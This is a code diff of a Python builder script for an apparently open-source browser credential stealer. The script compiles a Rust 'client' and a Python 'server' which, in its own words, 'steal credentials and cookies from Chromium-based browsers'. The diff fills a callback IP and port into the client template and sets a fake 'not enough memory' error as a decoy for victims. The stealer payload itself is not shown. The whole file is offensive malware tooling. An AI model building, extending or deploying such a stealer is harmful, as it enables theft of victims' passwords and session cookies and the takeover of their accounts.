@@ -9,23 +9,58 @@ through http connection.
 
 Note: To include a custom icon, change the icon for the server or client in the icons directory"""
 
+from _modules import setup
+import PyInstaller.__main__
 import os
 import shutil
 import argparse
 import socket
-import PyInstaller.__main__
+import subprocess
+import logging
+import configparser
+import stat
 
-template_dir = "templates"
-build_dir = "build"
-dist_dir = "dist"
-icon_dir = "icons"
+config = configparser.ConfigParser()
+config.read("config.ini")
+template_dir = config["DIRECTORIES"]["TemplateDir"]
+build_dir = config["DIRECTORIES"]["BuildDir"]
+dist_dir = config["DIRECTORIES"]["DistDir"]
+icon_dir = config["DIRECTORIES"]["IconDir"]
+chromepass_base = config["DIRECTORIES"]["ChromePassBase"]
+template_base = config["DIRECTORIES"]["ClientTemplateBase"]
+log_dir = config["DIRECTORIES"]["LogDir"]
+
+
+def rmtree(top):
+    for root, dirs, files in os.walk(top, topdown=False):
+        for name in files:
+            filename = os.path.join(root, name)
+            os.chmod(filename, stat.S_IWRITE)
+            os.remove(filename)
+        for name in dirs:
+            os.rmdir(os.path.join(root, name))
+    os.rmdir(top)
 
 
 def reset_folders():
     if os.path.exists(build_dir):
-        shutil.rmtree(build_dir)
+        rmtree(build_dir)
     if not os.path.exists(dist_dir):
         os.mkdir(dist_dir)
+
+
+def compile_client(build_command):
+    try:
+        build = subprocess.Popen(
+            ["powershell.exe", build_command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        for line in iter(build.stdout.readline, b''):
+            line = line.decode(encoding="ISO-8859-1")
+            print(line)
+            logging.debug(line)
+        return True
+    except Exception as e:
+        pass
+    return False
 
 
 def create_executable(filename, icon, mode="windowed"):
@@ -40,42 +75,41 @@ def create_executable(filename, icon, mode="windowed"):
     ])
 
 
-def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool="1", error_message="None", nocookies=False, nologin=False, port=80, include_python=False, nobuild=True):
-    reset_folders()
-    os.mkdir("build")
+def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", nocookies=False, nologin=False, port=80, nobuild=True):
     temp_path = f"{template_dir}/{filename}"
-    build_path = f"{build_dir}/{filename}.py"
-    dist_path = f"{dist_dir}/{filename}"
-    if os.path.exists(temp_path):
+    build_path = f"{template_dir}/{chromepass_base}/src/main.rs"
+    build_command = f"cd {build_dir}\\{chromepass_base}; cargo build --release;"
+    if os.path.exists(temp_path) and not nobuild:
+        print("[+] Building Client")
+        shutil.copytree(f"{template_dir}/{chromepass_base}",
+                        f"{build_dir}/{chromepass_base}")
+        shutil.copyfile(f"{icon_dir}/{icon}",
+                        f"{build_dir}/{chromepass_base}/icon.ico")
         with open(temp_path, "r") as f:
             content = f.read()
-        content = content.replace("<<IP_ADDRESS>>", f"{ip_address}")
-        content = content.replace("<<ERROR_BOOL>>", f"{error_bool}")
-        content = content.replace("<<ERROR_MESSAGE>>", f"{error_message}")
-        content = content.replace("<<COOKIES_BOOL>>", f"{nocookies}")
-        content = content.replace("<<LOGIN_BOOL>>", f"{nologin}")
+        content = content.replace("<<IP_ADDRESS>>", ip_address)
+        content = content.replace(
+            "<<ERROR_BOOL>>", "true" if error_bool else "false")
+        content = content.replace("<<ERROR_MESSAGE>>", error_message)
+        content = content.replace(
+            "<<COOKIES_BOOL>>", "true" if nocookies else "false")
+        content = content.replace(
+            "<<LOGIN_BOOL>>", "true" if nologin else "false")
         content = content.replace("<<PORT>>", f"{port}")
         with open(build_path, "w") as f:
             f.write(content)
-        if include_python:
-            shutil.copyfile(build_path, f"{dist_path}.py")
-        if not nobuild:
-            create_executable(filename, icon)
-            if os.path.exists(dist_path):
-                shutil.rmtree(dist_path)
-            shutil.copyfile(f"{build_dir}/dist/{filename}.exe",
-                            f"{dist_dir}/{filename}.exe")
-            if os.path.exists(f"{filename}.spec"):
-                os.remove(f"{filename}.spec")
-        reset_folders()
-        return True
-    print(f"[-] Error, file not found: {temp_path}")
+        print(build_command)
+        if compile_client(build_command):
+            shutil.copyfile(
+                f"{build_dir}/{chromepass_base}/target/release/chromepass.exe", f"{dist_dir}/{filename}.exe")
+            print("[+] Client build Successful")
+            return True
+    else:
+        print(f"[-] Error, file not found: {temp_path}")
     return False
 
 
 def build_server(filename="server", icon="server.ico", port=80, include_python=False, nobuild=True):
-    reset_folders()
-    os.mkdir("build")
     temp_path = f"{template_dir}/{filename}"
     build_path = f"{build_dir}/{filename}.py"
     dist_path = f"{dist_dir}/{filename}"
@@ -86,8 +120,10 @@ def build_server(filename="server", icon="server.ico", port=80, include_python=F
         with open(build_path, "w") as f:
             f.write(content)
         if include_python:
+            print("[+] Creating python Server")
             shutil.copyfile(build_path, f"{dist_path}.py")
         if not nobuild:
+            print("[+] Building Server")
             create_executable(filename, icon, mode="console")
             if os.path.exists(dist_path):
                 shutil.rmtree(dist_path)
@@ -95,19 +131,10 @@ def build_server(filename="server", icon="server.ico", port=80, include_python=F
                             f"{dist_dir}/{filename}.exe")
             if os.path.exists(f"{filename}.spec"):
                 os.remove(f"{filename}.spec")
-        reset_folders()
+        print("[+] Server build successful.")
         return True
     print(f"[-] Error, file not found: {temp_path}")
     return False
-
-
-def show_options():
-    try:
-        pass
-    except PermissionError as e:
-        os.system("cls")
-        filename = str(e).split(" ")[-1]
-        print(f"[-] Can't access file, make sure it's closed: {filename}")
 
 
 def build_message(server, client):
@@ -119,6 +146,7 @@ def build_message(server, client):
     if server and client:
         print(
             f"[+] Build was successful. The file(s) should be in the directory: {dist_dir}")
+    reset_folders()
 
 
 def check_valid_port(port):
@@ -135,7 +163,7 @@ def check_valid_port(port):
 def parse_arguments():
     error_message = "There isn't enough memory to complete this action. Try using less data or closing other applications."
     parser = argparse.ArgumentParser(
-        description='Creates a server and client to steal credentials and cookies from Chrome')
+        description='Creates a server and client to steal credentials and cookies from Chromium-based browsers: (Chrome, Chromium, Edge, Brave, etc...)')
     parser.add_argument('--ip', metavar="IP", type=str, default="127.0.0.1",
                         help="IP address to connect to, or reverse dns. Default is 127.0.0.1")
     parser.add_argument('--port', metavar="PORT", type=check_valid_port, default=80,
@@ -150,8 +178,6 @@ def parse_arguments():
                         action="store_true", default=False, help="Use to only capture cookies and not credentials. Default is both")
     parser.add_argument('--pyserver', dest="pyserver",
                         action="store_true", default=False, help="Creates a python version of the server. Pair it with --nobuild-server to only have it as python")
-    parser.add_argument('--pyclient', dest="pyclient",
-                        action="store_true", default=False, help="Creates a python version of the client. Pair it with --nobuild-client to only have it as python. This is for testing purposes")
     parser.add_argument('--nobuild_server', dest="noserver",
                         action="store_true", default=False, help="Doesn't build the server")
     parser.add_argument('--nobuild_client', dest="noclient",
@@ -164,10 +190,12 @@ def parse_arguments():
         print("The ip address is wrong, please try again")
         return False
 
+    reset_folders()
+    os.mkdir(build_dir)
     server = build_server(
         port=args.port, include_python=args.pyserver, nobuild=args.noserver)
     client = build_client(ip_address=args.ip, error_bool=args.error_bool, error_message=args.message,
-                          nocookies=args.cookies_bool, nologin=args.login_bool, port=args.port, include_python=args.pyclient, nobuild=args.noclient)
+                          nocookies=args.cookies_bool, nologin=args.login_bool, port=args.port, nobuild=args.noclient)
     build_message(server, client)
 
 
